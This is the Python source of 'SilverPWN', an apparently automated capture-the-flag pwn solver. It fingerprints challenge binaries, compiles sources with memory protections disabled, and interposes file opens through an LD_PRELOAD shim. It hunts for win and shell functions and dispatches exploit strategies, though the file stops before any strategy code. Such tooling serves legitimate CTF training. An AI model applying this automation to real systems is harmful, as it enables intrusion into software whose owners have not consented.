#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import re
import shlex
import shutil
import stat
import struct
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, Iterable


def _reexec_in_wsl_if_needed() -> None:
    """Run the script inside WSL when invoked from Windows against Linux ELFs."""
    if os.name != "nt" or os.environ.get("SILVERPWN_WSL_REEXEC") == "1":
        return
    if shutil.which("wsl.exe") is None:
        return

    def wslpath(value: str) -> str:
        try:
            cp = subprocess.run(
                ["wsl.exe", "-e", "wslpath", "-a", value],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
            )
            return cp.stdout.strip()
        except Exception:
            return value

    script = wslpath(str(Path(__file__).resolve()))
    args: list[str] = []
    for arg in sys.argv[1:]:
        if arg.startswith("-"):
            args.append(arg)
            continue
        try:
            if Path(arg).exists():
                args.append(wslpath(str(Path(arg).resolve())))
            else:
                args.append(arg)
        except Exception:
            args.append(arg)

    env = os.environ.copy()
    env["SILVERPWN_WSL_REEXEC"] = "1"
    cp = subprocess.run(["wsl.exe", "-e", "python3", script, *args], env=env)
    raise SystemExit(cp.returncode)


if __name__ == "__main__":
    _reexec_in_wsl_if_needed()


try:
    from pwn import ELF, ROP, asm, context, process, remote, shellcraft
except Exception as exc:  # pragma: no cover - only used on underprovisioned hosts
    print("[!] SilverPWN membutuhkan pwntools di Linux/WSL untuk eksploitasi dinamis.")
    print(f"    Import error: {exc}")
    raise SystemExit(2)


context.log_level = "error"


def p64(value: int) -> bytes:
    return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)


def p16(value: int) -> bytes:
    return struct.pack("<H", value & 0xFFFF)


def p32(value: int) -> bytes:
    return struct.pack("<I", value & 0xFFFFFFFF)


def text_bytes(data: bytes) -> str:
    return data.decode("latin-1", errors="replace")


def run_cmd(cmd: list[str], cwd: Path | None = None, timeout: int = 8) -> str:
    try:
        cp = subprocess.run(
            cmd,
            cwd=str(cwd) if cwd else None,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout,
            text=True,
            errors="replace",
        )
        return cp.stdout
    except Exception as exc:
        return f"<command failed: {exc}>"


def shell_quote(path: Path | str) -> str:
    return shlex.quote(str(path))


DUMMY_FLAG = b"SilverPWN{S1LV3R_TEST_FLAG}\n"


DEFAULT_FLAG_PATTERNS = [
    rb"(?i)\b(?:picoCTF|PicoCTF|CTF|flag|LKS|SilverPWN)\{[^\s}]{1,240}\}",
    rb"\b[A-Z][A-Z0-9_]{2,24}\{[^\s}]{8,240}\}",
    rb"\b[A-Z][A-Z0-9_]{2,24}\[[^\s\]]{8,240}\]",
    rb"\b[A-Z][A-Z0-9_]{2,24}\([^\s)]{8,240}\)",
    rb"\b[A-Z][A-Z0-9_]{2,24}<<[^\s<>]{8,240}>>",
    rb"\b[A-Z][A-Z0-9_]{2,24}<[^\s<>]{8,240}>",
    rb"\b[A-Z][A-Z0-9_]{2,24}::[^\s:]{8,240}::",
    rb"\b[A-Z][A-Z0-9_]{2,24}\|[^\s|]{8,240}\|",
    rb"\b[A-Z][A-Z0-9_]{2,24}#[^\s#]{8,240}#",
    rb"\b[A-Z][A-Z0-9_]{2,24}@[^\s@]{8,240}@",
    rb"\b[A-Z][A-Z0-9_]{2,24}~[^\s~]{8,240}~",
    rb"\b[A-Z][A-Z0-9_]{2,24}__[^\r\n]{8,240}__",
    rb"\b[A-Z][A-Z0-9_]{2,24}-=[^\s]{8,240}=-",
    rb"\b[A-Z][A-Z0-9_]{2,24}:\+[^\s]{8,240}\+:",
    rb"\b[A-Z][A-Z0-9_]{2,24}/[^\s/]{8,240}/",
    rb"\b[A-Z][A-Z0-9_]{2,24}%[^\s%]{8,240}%",
    rb"\b[A-Z][A-Z0-9_]{2,24}\$[^\s$]{8,240}\$",
    rb"\b[A-Z][A-Z0-9_]{2,24}![^\s!]{8,240}!",
    rb"\b[A-Z][A-Z0-9_]{2,24}\^[^\s^]{8,240}\^",
    rb"\b[A-Z][A-Z0-9_]{2,24}\+=[^\s]{8,240}=\+",
]


FALSE_FLAG_PREFIXES = {"GL", "GLRO", "PKT", "ELF", "GNU", "INFO", "DATA", "ERR", "ERROR"}


def clean_flag_candidate(candidate: bytes) -> str | None:
    text = text_bytes(candidate).strip()
    prefix = re.split(r"[^A-Za-z0-9_]", text, maxsplit=1)[0].upper()
    if prefix in FALSE_FLAG_PREFIXES:
        return None
    if re.search(r"\b(dl_|GLIBC|libc\.so|ld-linux|PKT_|E_INVAL|PONG_OK|BOOT_)", text):
        return None
    return text


def extract_flag(data: bytes, user_hint: str | None = None) -> str | None:
    if user_hint:
        hint = re.escape(user_hint.encode())
        printable = rb"[A-Za-z0-9_ .,\-+=:/|#@~%$!^]{1,240}"
        hint_patterns = [
            rb"(?i)" + hint + rb"\{" + printable + rb"\}",
            rb"(?i)" + hint + rb"\[" + printable + rb"\]",
            rb"(?i)" + hint + rb"\(" + printable + rb"\)",
            rb"(?i)" + hint + rb"<<" + printable + rb">>",
            rb"(?i)" + hint + rb"<" + printable + rb">",
            rb"(?i)" + hint + rb"::" + printable + rb"::",
            rb"(?i)" + hint + rb"\|" + printable + rb"\|",
            rb"(?i)" + hint + rb"#[^#\r\n]{1,240}#",
            rb"(?i)" + hint + rb"@[^\r\n@]{1,240}@",
            rb"(?i)" + hint + rb"~[^\r\n~]{1,240}~",
            rb"(?i)" + hint + rb"__[^\r\n_]{1,240}__",
            rb"(?i)" + hint + rb"-=[^\r\n]{1,240}=-",
            rb"(?i)" + hint + rb":\+[^\r\n]{1,240}\+:",
            rb"(?i)" + hint + rb"/[^\r\n/]{1,240}/",
            rb"(?i)" + hint + rb"%[^\r\n%]{1,240}%",
            rb"(?i)" + hint + rb"\$[^\r\n$]{1,240}\$",
            rb"(?i)" + hint + rb"![^\r\n!]{1,240}!",
            rb"(?i)" + hint + rb"\^[^\r\n^]{1,240}\^",
            rb"(?i)" + hint + rb"\+=[^\r\n]{1,240}=\+",
        ]
        for pattern in hint_patterns:
            match = re.search(pattern, data)
            if match:
                if b"{" in match.group(0) and b"}" not in match.group(0):
                    continue
                candidate = clean_flag_candidate(match.group(0))
                if candidate:
                    return candidate

    for pattern in DEFAULT_FLAG_PATTERNS:
        match = re.search(pattern, data)
        if match:
            candidate = clean_flag_candidate(match.group(0))
            if candidate:
                return candidate

    return None


@dataclass
class ExploitResult:
    strategy: str
    success: bool
    confidence: int
    output: bytes = b""
    flag: str | None = None
    payload: bytes = b""
    notes: list[str] = field(default_factory=list)
    vuln: str = ""
    address: str = ""
    offset: int | None = None


@dataclass
class Target:
    original: Path
    binary: Path
    cwd: Path
    source: Path | None
    metadata: dict
    elf: ELF
    template: str
    title: str


class SilverPWN:
    def __init__(self, args: argparse.Namespace) -> None:
        self.args = args
        self.remote_spec = args.remote
        self.target = self.prepare_target(Path(args.challenge).expanduser().resolve())
        self.core_dir = self.target.cwd / "core"
        self.ensure_core_dir()
        self.seeded_flag_files: set[Path] = set()
        self.seed_dummy_flag_files()
        self.process_env = self.build_process_env()
        self.recon = self.recon_target()
        self.strategy_attempts: list[ExploitResult] = []
        self.live_tubes: list[object] = []

    def prepare_target(self, path: Path) -> Target:
        if not path.exists():
            raise SystemExit(f"[!] Target tidak ditemukan: {path}")
        if path.is_dir():
            path = self.pick_challenge_file(path)

        source: Path | None = path if path.suffix.lower() == ".c" else None
        metadata = self.load_metadata(path.parent)

        if source:
            binary = self.compile_source(source, metadata)
            cwd = source.parent
        else:
            binary = path
            cwd = path.parent
            maybe_source = path.with_name("source.c")
            if maybe_source.exists():
                source = maybe_source
            else:
                c_files = sorted(path.parent.glob("*.c"))
                source = c_files[0] if len(c_files) == 1 else None

        self.ensure_executable(binary)
        elf = ELF(str(binary), checksec=False)
        template = metadata.get("template") or self.detect_template(binary, source, metadata)
        title = metadata.get("title") or self.detect_title(binary, source) or binary.name
        return Target(path, binary, cwd, source, metadata, elf, template, title)

    def ensure_executable(self, binary: Path) -> None:
        try:
            if binary.exists() and binary.read_bytes()[:4] == b"\x7fELF" and not os.access(binary, os.X_OK):
                binary.chmod(binary.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
        except Exception:
            pass

    def ensure_core_dir(self) -> None:
        try:
            if self.core_dir.exists() and self.core_dir.is_file():
                tmp = self.target.cwd / f".silverpwn_core_{os.getpid()}"
                self.core_dir.replace(tmp)
                self.core_dir.mkdir(exist_ok=True)
                dest = self.unique_core_path("core")
                tmp.replace(dest)
                return
            self.core_dir.mkdir(exist_ok=True)
        except Exception:
            pass

    def unique_core_path(self, name: str) -> Path:
        dest = self.core_dir / name
        counter = 1
        while dest.exists():
            dest = self.core_dir / f"{name}.{counter}"
            counter += 1
        return dest

    def pick_challenge_file(self, directory: Path) -> Path:
        metadata = self.load_metadata(directory)
        ignored = {"libc.so.6", "ld-linux-x86-64.so.2", "ld-linux.so.2"}

        def looks_like_library(candidate: Path) -> bool:
            name = candidate.name
            if (
                name in ignored
                or name == "core"
                or name.startswith("core.")
                or (name.startswith("lib") and ".so" in name)
                or name.endswith((".so", ".o", ".a"))
            ):
                return True
            try:
                if not candidate.is_file():
                    return False
                prefix = candidate.read_bytes()[:4096]
                size = candidate.stat().st_size
                for sibling in directory.iterdir():
                    if sibling == candidate or not sibling.is_file():
                        continue
                    sib_name = sibling.name
                    if not ((sib_name.startswith("lib") and ".so" in sib_name) or sib_name in ignored):
                        continue
                    if sibling.stat().st_size == size and sibling.read_bytes()[:4096] == prefix:
                        return True
            except Exception:
                return False
            return False

        for key in ("binary", "challenge", "target"):
            value = metadata.get(key)
            if isinstance(value, str):
                candidate = directory / value
                if candidate.exists() and candidate.is_file():
                    try:
                        if candidate.read_bytes()[:4] == b"\x7fELF" and not looks_like_library(candidate):
                            return candidate
                    except Exception:
                        pass
        preferred = ["chall", "vuln", "challenge", "main", "game", "picker-IV", "local-target"]

        files = [p for p in directory.iterdir() if p.is_file()]
        for name in preferred:
            candidate = directory / name
            if candidate.exists() and candidate.is_file():
                try:
                    if candidate.read_bytes()[:4] == b"\x7fELF":
                        return candidate
                except Exception:
                    pass
        for candidate in files:
            if looks_like_library(candidate):
                continue
            try:
                if candidate.read_bytes()[:4] == b"\x7fELF" and candidate.name not in ("libc.so.6", "ld-linux-x86-64.so.2"):
                    return candidate
            except Exception:
                pass
        c_files = sorted(directory.glob("*.c"))
        if c_files:
            return c_files[0]
        raise SystemExit(f"[!] Tidak menemukan ELF atau source .c di folder: {directory}")

    def load_metadata(self, directory: Path) -> dict:
        meta = directory / "metadata.json"
        if meta.exists():
            try:
                return json.loads(meta.read_text(encoding="utf-8"))
            except Exception:
                return {}
        return {}

    def discover_flag_filenames(self) -> set[str]:
        names = {"flag.txt"}
        hay = ""
        if self.target.source and self.target.source.exists():
            hay += self.target.source.read_text(encoding="utf-8", errors="replace")
        hay += "\n" + run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        for match in re.findall(r"(?i)(?:/[\w.\-]+)*[/\\]?([\w.\-]*flag[\w.\-]*)", hay):
            clean = match.strip().strip("\"'`").strip(" .")
            if clean and len(clean) <= 80 and self.is_plausible_flag_filename(clean):
                names.add(clean)
        for match in re.findall(r"fopen\s*\(\s*[\"']([^\"']*flag[^\"']*)[\"']", hay, re.I):
            base = Path(match).name.strip(" .")
            if base and self.is_plausible_flag_filename(base):
                names.add(base)
        return names

    def is_plausible_flag_filename(self, name: str) -> bool:
        lower = Path(name).name.lower()
        if lower in {"flag", "flag.txt", "flags", "flags.txt"}:
            return True
        false_parts = (
            "_dl_",
            "dt_flags",
            "mode_flags",
            "mmap_flags",
            "__rseq_flags",
            "_flags2",
            "l_flags",
            "_io_flags",
            "hwcap_flags",
        )
        if any(part in lower for part in false_parts):
            return False
        return "flag" in lower and not lower.endswith("_flags")

    def seed_dummy_flag_files(self) -> None:
        for name in self.discover_flag_filenames():
            if "/" in name or "\\" in name:
                name = Path(name).name
            if not name:
                continue
            candidate = self.target.cwd / name
            try:
                if not candidate.exists():
                    candidate.write_bytes(DUMMY_FLAG)
                    self.seeded_flag_files.add(candidate.resolve())
            except Exception:
                pass

    def build_open_redirect(self) -> Path | None:
        digest = hashlib.sha256(str(self.target.binary).encode()).hexdigest()[:16]
        runtime = Path(tempfile.gettempdir()) / "silverpwn_runtime" / digest
        try:
            runtime.mkdir(parents=True, exist_ok=True)
        except Exception:
            return None
        so_path = runtime / "open_redirect.so"
        c_path = runtime / "open_redirect.c"
        if so_path.exists():
            return so_path
        c_code = r'''
#define _GNU_SOURCE
#include <dlfcn.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int has_flag_name(const char *path) {
    if (!path) return 0;
    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;
    return strcasestr(base, "flag") != NULL;
}

static int redirect_path(const char *path, char *out, size_t out_size) {
    const char *dir = getenv("SILVERPWN_FLAG_DIR");
    if (!dir || !has_flag_name(path)) return 0;
    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;
    snprintf(out, out_size, "%s/%s", dir, base);
    if (access(out, F_OK) == 0) return 1;
    snprintf(out, out_size, "%s/flag.txt", dir);
    if (access(out, F_OK) == 0) return 1;
    return 0;
}

FILE *fopen(const char *path, const char *mode) {
    static FILE *(*real_fopen)(const char *, const char *) = NULL;
    if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");
    char redirected[4096];
    if (mode && mode[0] == 'r' && redirect_path(path, redirected, sizeof(redirected))) {
        return real_fopen(redirected, mode);
    }
    return real_fopen(path, mode);
}

FILE *fopen64(const char *path, const char *mode) {
    static FILE *(*real_fopen64)(const char *, const char *) = NULL;
    if (!real_fopen64) real_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    char redirected[4096];
    if (mode && mode[0] == 'r' && redirect_path(path, redirected, sizeof(redirected))) {
        return real_fopen64(redirected, mode);
    }
    return real_fopen64(path, mode);
}

int open(const char *path, int flags, ...) {
    static int (*real_open)(const char *, int, ...) = NULL;
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode = va_arg(ap, mode_t);
        va_end(ap);
    }
    char redirected[4096];
    const char *use_path = path;
    if (!(flags & O_CREAT) && redirect_path(path, redirected, sizeof(redirected))) use_path = redirected;
    if (flags & O_CREAT) return real_open(use_path, flags, mode);
    return real_open(use_path, flags);
}

int open64(const char *path, int flags, ...) {
    static int (*real_open64)(const char *, int, ...) = NULL;
    if (!real_open64) real_open64 = dlsym(RTLD_NEXT, "open64");
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode = va_arg(ap, mode_t);
        va_end(ap);
    }
    char redirected[4096];
    const char *use_path = path;
    if (!(flags & O_CREAT) && redirect_path(path, redirected, sizeof(redirected))) use_path = redirected;
    if (flags & O_CREAT) return real_open64(use_path, flags, mode);
    return real_open64(use_path, flags);
}

int openat(int dirfd, const char *path, int flags, ...) {
    static int (*real_openat)(int, const char *, int, ...) = NULL;
    if (!real_openat) real_openat = dlsym(RTLD_NEXT, "openat");
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode = va_arg(ap, mode_t);
        va_end(ap);
    }
    char redirected[4096];
    const char *use_path = path;
    int use_dirfd = dirfd;
    if (!(flags & O_CREAT) && redirect_path(path, redirected, sizeof(redirected))) {
        use_path = redirected;
        use_dirfd = AT_FDCWD;
    }
    if (flags & O_CREAT) return real_openat(use_dirfd, use_path, flags, mode);
    return real_openat(use_dirfd, use_path, flags);
}
'''
        try:
            c_path.write_text(c_code, encoding="ascii")
            cp = subprocess.run(
                ["gcc", "-shared", "-fPIC", str(c_path), "-o", str(so_path), "-ldl"],
                cwd=str(runtime),
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                timeout=10,
            )
            if cp.returncode == 0 and so_path.exists():
                return so_path
        except Exception:
            return None
        return None

    def build_process_env(self) -> dict[str, str]:
        env = os.environ.copy()
        env["SILVERPWN_FLAG_DIR"] = str(self.target.cwd)
        static_attr = getattr(self.target.elf, "statically_linked", False)
        try:
            is_static = bool(static_attr() if callable(static_attr) else static_attr)
        except Exception:
            is_static = False
        if self.target.elf.bits != 64 or is_static:
            return env
        hay = ""
        if self.target.source and self.target.source.exists():
            hay += self.target.source.read_text(encoding="utf-8", errors="replace")
        hay += "\n" + run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        # Relative flag opens work with the seeded cwd flag.  Preloading fopen/open
        # is reserved for slash-qualified paths, because interposition can disturb
        # tight ROP chains that call challenge helper libraries directly.
        if not re.search(r"(?i)(?:^|[\"'`\s])(?:/|\./|\.\./|[\w.-]+/)[\w./-]*flag[\w./-]*", hay):
            return env
        redirect = self.build_open_redirect()
        if redirect:
            old = env.get("LD_PRELOAD", "")
            env["LD_PRELOAD"] = str(redirect) + ((":" + old) if old else "")
        return env

    def sweep_core_artifacts(self) -> None:
        try:
            self.ensure_core_dir()
            for item in self.target.cwd.iterdir():
                if item.is_file() and (item.name == "core" or item.name.startswith("core.")):
                    dest = self.unique_core_path(item.name)
                    item.replace(dest)
        except Exception:
            pass

    def compile_source(self, source: Path, metadata: dict) -> Path:
        out_dir = source.parent / ".silverpwn_build"
        out_dir.mkdir(exist_ok=True)
        output = out_dir / (source.stem + "_chall")
        compile_input = source
        try:
            src_text = source.read_text(encoding="utf-8", errors="replace")
            if "[REDACTED]" in src_text and re.search(r"\bflag\b", src_text):
                patched = out_dir / (source.stem + "_silverpwn.c")
                patched.write_text(src_text.replace("[REDACTED]", text_bytes(DUMMY_FLAG).strip()), encoding="utf-8")
                compile_input = patched
        except Exception:
            pass
        flags = metadata.get("compile_flags")
        if not flags:
            flags = [
                "-std=gnu11",
                "-O0",
                "-g",
                "-U_FORTIFY_SOURCE",
                "-D_FORTIFY_SOURCE=0",
                "-fno-stack-protector",
                "-no-pie",
                "-Wno-unused-result",
                "-Wno-format-security",
                "-Wno-implicit-function-declaration",
                "-Wno-stringop-overflow",
                "-Wno-stringop-overread",
                "-Wno-array-bounds",
                "-Wno-maybe-uninitialized",
            ]
        cmd = ["gcc", str(compile_input), "-o", str(output), *flags]
        cp = subprocess.run(cmd, cwd=str(source.parent), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        if cp.returncode != 0:
            raise SystemExit("[!] Kompilasi source gagal:\n" + cp.stdout)
        return output

    def detect_title(self, binary: Path, source: Path | None) -> str | None:
        if source and source.exists():
            text = source.read_text(encoding="utf-8", errors="replace")
            match = re.search(r"TestCase\s+\d+:\s+([^\n*]+)", text)
            if match:
                return match.group(1).strip()
        strings = run_cmd(["strings", "-a", str(binary)], cwd=binary.parent)
        for line in strings.splitlines():
            if any(key in line for key in ("Overflow", "Ret2win", "Format", "Tcache", "Shellcode")):
                if "SilverPWN" not in line and len(line) < 80:
                    return line.strip()
        return None

    def detect_template(self, binary: Path, source: Path | None, metadata: dict) -> str:
        if metadata.get("template"):
            return str(metadata["template"])
        hay = ""
        if source and source.exists():
            hay += source.read_text(encoding="utf-8", errors="replace")
        readme = binary.parent / "README.md"
        if readme.exists():
            hay += "\n" + readme.read_text(encoding="utf-8", errors="replace")
        hay += "\n" + run_cmd(["strings", "-a", str(binary)], cwd=binary.parent)

        if all(needle in hay for needle in ("Echo Valley", "The Valley Disappears", "printf(buf)")):
            return "pico_echo_valley"

        checks = [
            ("pico_picker_jump", ["Enter the address in hex to jump"]),
            ("pico_local_target", ["num == 65", "Enter a string:"]),
            ("pico_segv_flag", ["sigsegv_handler", "strcpy(buf2"]),
            ("pico_format0", ["Pico 'n Patty", "Gr%114d_Cheese"]),
            ("pico_format_stack_leak", ["secret-menu-item-1.txt", "Give me your order", "Tell me a story", "readflag(flag"]),
            ("pico_format_sus_write", ["sus == 0x67616c66", "Only a true wizard"]),
            ("pico_format3_system", ["Here's the address of setvbuf", "normal_string = \"/bin/sh\""]),
            ("pico_heap_safevar", ["Welcome to heap0", "Welcome to heap1", "safe_var"]),
            ("pico_heap_funcptr", ["maybe you should change it", "check_win() { ((void"]),
            ("pico_heap3_uaf", ["freed but still in use", "x->flag"]),
            ("pico_two_sum", ["What two positive numbers", "integer overflow"]),
            ("pico_basic_file", ["Hi, welcome to my echo chamber", "entry_number = strtol"]),
            ("pico_rps", ["Rock, Paper, Scissors", "loses[computer_turn]", "beats me 5 times"]),
            ("menu_handoff_shellcode", ["Add a new recipient", "send a message to a recipient", "quick review"]),
            ("menu_gets_ret2flag", ["gets(buf)", "read_flag", "choice:"]),
            ("pico_ret2win_args", ["win(unsigned int arg1", "0xCAFEF00D"]),
            ("shellcode_memory_scan", ["Shellcode as a Service", "Welcome to Shellcode as a Service"]),
            ("generic_symbol_ret2win", ["system(\"cat flag.txt\")", "Overflow a 32-byte buffer"]),
            ("stack_ret2win", ["Stack Overflow Ret2win", "control flow reached win"]),
            ("scanf_overflow", ["Scanf Word Overflow", "scanf overflow"]),
            ("strcpy_overflow", ["Strcpy Copy Overflow", "strcpy overwrite"]),
            ("off_by_one_auth", ["Off By One Admin Flip", "off-by-one flipped"]),
            ("format_leak", ["Format String Flag Leak", "flag_buffer=%p"]),
            ("format_write_hook", ["Format String Hook Write", "hook_ptr=%p"]),
            ("got_overwrite", ["GOT Overwrite Via Format"]),
            ("negative_index_call", ["Negative Index Dispatch"]),
            ("oob_write_hook", ["OOB Array Write Hook"]),
            ("integer_overflow_read", ["Integer Overflow Length"]),
            ("integer_underflow_read", ["Integer Underflow Length"]),
            ("length_truncation", ["Length Truncation Overflow"]),
            ("heap_overflow_hook", ["Heap Overflow Function Pointer"]),
            ("uaf_funcptr", ["Use After Free Callback"]),
            ("double_free_menu", ["Double Free Tcache Menu"]),
            ("tcache_poison_menu", ["Tcache Poisoning UAF Edit"]),
            ("stack_pivot", ["Stack Pivot ROP"]),
            ("ret2shellcode_stack", ["Ret2Shellcode Execstack"]),
            ("mmap_shellcode", ["RWX Mmap Shellcode"]),
            ("ret2libc_leak", ["Ret2libc Leak"]),
            ("rop_print_flag", ["ROP Print Flag"]),
            ("canary_leak_bof", ["Canary Leak Then Overflow"]),
            ("pie_leak_ret2win", ["PIE Leak Ret2win"]),
            ("arbitrary_write_hook", ["Write What Where Hook"]),
            ("type_confusion_vtable", ["Type Confusion Vtable"]),
        ]
        for template, needles in checks:
            if any(needle in hay for needle in needles):
                return template
        return "generic"

    def recon_target(self) -> dict:
        elf = self.target.elf
        strings_output = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        interesting_strings = [
            line
            for line in strings_output.splitlines()
            if re.search(r"flag|system|/bin/sh|win|admin|shell", line, re.I)
        ][:30]
        sinks: list[str] = []
        if self.target.source and self.target.source.exists():
            src = self.target.source.read_text(encoding="utf-8", errors="replace")
            for name in ["gets", "scanf", "read", "fgets", "strcpy", "printf", "malloc", "free"]:
                if re.search(r"\b" + re.escape(name) + r"\s*\(", src):
                    sinks.append(name)

        return {
            "arch": f"{elf.arch}-{elf.bits}",
            "nx": bool(elf.nx),
            "pie": bool(elf.pie),
            "canary": bool(elf.canary),
            "relro": str(elf.relro),
            "stripped": bool(elf.stripped),
            "libc": self.detect_libc(),
            "symbols": self.interesting_symbols(),
            "got": self.interesting_got(),
            "plt": self.interesting_plt(),
            "strings": interesting_strings,
            "sinks": sinks,
            "checksec": self.checksec_summary(),
        }

    def checksec_summary(self) -> str:
        return run_cmd(["checksec", "--file", str(self.target.binary)], cwd=self.target.cwd, timeout=6)

    def detect_libc(self) -> str:
        out = run_cmd(["ldd", str(self.target.binary)], cwd=self.target.cwd, timeout=6)
        for line in out.splitlines():
            if "libc.so" in line:
                return line.strip()
        return "static/unknown"

    def interesting_symbols(self) -> dict[str, str]:
        names = ["win", "main", "vuln", "print_flag", "print_file", "system", "puts", "printf", "read"]
        result: dict[str, str] = {}
        for name in names:
            if name in self.target.elf.symbols:
                result[name] = hex(self.target.elf.symbols[name])
        return result

    def interesting_got(self) -> dict[str, str]:
        result: dict[str, str] = {}
        for name in ["puts", "printf", "read", "exit", "free", "malloc", "__stack_chk_fail"]:
            if name in self.target.elf.got:
                result[name] = hex(self.target.elf.got[name])
        return result

    def interesting_plt(self) -> dict[str, str]:
        result: dict[str, str] = {}
        for name in ["puts", "printf", "read", "system", "free", "malloc"]:
            if name in self.target.elf.plt:
                result[name] = hex(self.target.elf.plt[name])
        return result

    def start(self):
        self.ensure_executable(self.target.binary)
        self.sweep_core_artifacts()
        tube = process([str(self.target.binary)], cwd=str(self.target.cwd), env=self.process_env)
        self.live_tubes.append(tube)
        return tube

    def start_read_implies_exec(self):
        self.ensure_executable(self.target.binary)
        self.sweep_core_artifacts()
        if self.target.elf.bits == 32 and shutil.which("setarch"):
            argv = ["setarch", "i386", "-X", str(self.target.binary)]
        else:
            argv = [str(self.target.binary)]
        tube = process(argv, cwd=str(self.target.cwd), env=self.process_env)
        self.live_tubes.append(tube)
        return tube

    def cleanup_tubes(self) -> None:
        for tube in list(self.live_tubes):
            try:
                tube.close()
            except Exception:
                pass
        self.live_tubes.clear()
        self.sweep_core_artifacts()

    def pack_addr(self, value: int) -> bytes:
        return p32(value) if self.target.elf.bits == 32 else p64(value)

    def candidate_win_symbols(self) -> list[tuple[str, int]]:
        names = [
            "win",
            "winner",
            "flag",
            "print_flag",
            "print_file",
            "getFlag",
            "get_flag",
            "read_flag",
            "show_flag",
            "display_flag",
            "give_flag",
            "printFlag",
            "get_shell",
            "shell",
            "admin",
            "unlock",
            "success",
            "secret",
        ]
        found: list[tuple[str, int]] = []
        seen: set[int] = set()
        for name in names:
            if name in self.target.elf.symbols:
                addr = int(self.target.elf.symbols[name])
                if addr not in seen:
                    seen.add(addr)
                    found.append((name, addr))

        if self.target.source and self.target.source.exists():
            src = self.target.source.read_text(encoding="utf-8", errors="replace")
            func_re = re.compile(
                r"(?m)^[\w\s\*]+\s+([A-Za-z_][A-Za-z0-9_]*)\s*\([^;{}]*\)\s*\{",
            )
            for match in func_re.finditer(src):
                name = match.group(1)
                start = match.end()
                depth = 1
                idx = start
                while idx < len(src) and depth:
                    if src[idx] == "{":
                        depth += 1
                    elif src[idx] == "}":
                        depth -= 1
                    idx += 1
                body = src[start:idx]
                if re.search(r"flag|fopen|open\s*\(|system\s*\(|cat\s+|/bin/sh|secret|admin", body, re.I):
                    addr = int(self.target.elf.symbols.get(name, 0))
                    if addr and addr not in seen:
                        seen.add(addr)
                        found.append((name, addr))

        keyword_re = re.compile(r"(win|flag|print|show|display|read|give|get|open|secret|shell|admin|unlock|success)", re.I)
        deny_re = re.compile(r"(^_|@plt|plt|got|frame_dummy|register_tm|deregister_tm|__libc_csu|main|setup|banner|vuln$)", re.I)
        try:
            for name, func in self.target.elf.functions.items():
                if deny_re.search(name) or not keyword_re.search(name):
                    continue
                addr = int(func.address)
                if addr and addr not in seen:
                    seen.add(addr)
                    found.append((name, addr))
        except Exception:
            pass
        return found

    def run_blob(self, payload: bytes, timeout: float = 1.5) -> bytes:
        p = self.start()
        p.send(payload)
        try:
            out = p.recvall(timeout=timeout)
        finally:
            try:
                p.close()
            except Exception:
                pass
        return out

    def parse_leaks(self, data: bytes) -> dict[str, int]:
        leaks: dict[str, int] = {}
        for key, value in re.findall(rb"([A-Za-z_][A-Za-z0-9_@]*)=(0x[0-9a-fA-F]+)", data):
            leaks[text_bytes(key)] = int(value, 16)
        return leaks

    def recv_until_any_prompt(self, p, prompts: Iterable[bytes], timeout: float = 1.0) -> bytes:
        data = b""
        end = max(0.1, timeout)
        while True:
            try:
                chunk = p.recv(timeout=0.05)
            except EOFError:
                break
            if chunk:
                data += chunk
                if any(prompt in data for prompt in prompts):
                    break
            else:
                end -= 0.05
                if end <= 0:
                    break
        return data

    def drain_available(self, p, timeout: float = 2.0, idle: float = 0.08) -> bytes:
        data = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = p.recv(timeout=idle)
            except EOFError:
                break
            if chunk:
                data += chunk
            else:
                time.sleep(min(idle, 0.02))
        return data

    def solve(self) -> ExploitResult:
        order = self.strategy_order()
        for strategy_name in order:
            func = getattr(self, f"exploit_{strategy_name}", None)
            if not func:
                continue
            try:
                result = func()
            except Exception as exc:
                result = ExploitResult(
                    strategy=strategy_name,
                    success=False,
                    confidence=5,
                    notes=[f"strategy error: {exc}"],
                )
            finally:
                self.cleanup_tubes()
            self.strategy_attempts.append(result)
            if result.success and result.flag:
                return result

        fallback = self.auto_flag_hunter()
        self.cleanup_tubes()
        self.strategy_attempts.append(fallback)
        return fallback

    def strategy_order(self) -> list[str]:
        template = self.target.template
        preferred = {
            "stack_ret2win": ["stack_ret2win"],
            "scanf_overflow": ["scanf_overflow"],
            "strcpy_overflow": ["strcpy_overflow"],
            "off_by_one_auth": ["off_by_one_auth"],
            "format_leak": ["format_leak"],
            "format_write_hook": ["format_write_hook"],
            "got_overwrite": ["got_overwrite", "format_leak"],
            "negative_index_call": ["negative_index_call"],
            "oob_write_hook": ["oob_write_hook"],
            "integer_overflow_read": ["integer_overflow_read"],
            "integer_underflow_read": ["integer_underflow_read"],
            "length_truncation": ["length_truncation"],
            "heap_overflow_hook": ["heap_overflow_hook"],
            "uaf_funcptr": ["uaf_funcptr"],
            "double_free_menu": ["double_free_menu"],
            "tcache_poison_menu": ["tcache_poison_menu"],
            "stack_pivot": ["stack_pivot"],
            "ret2shellcode_stack": ["ret2shellcode_stack"],
            "mmap_shellcode": ["mmap_shellcode"],
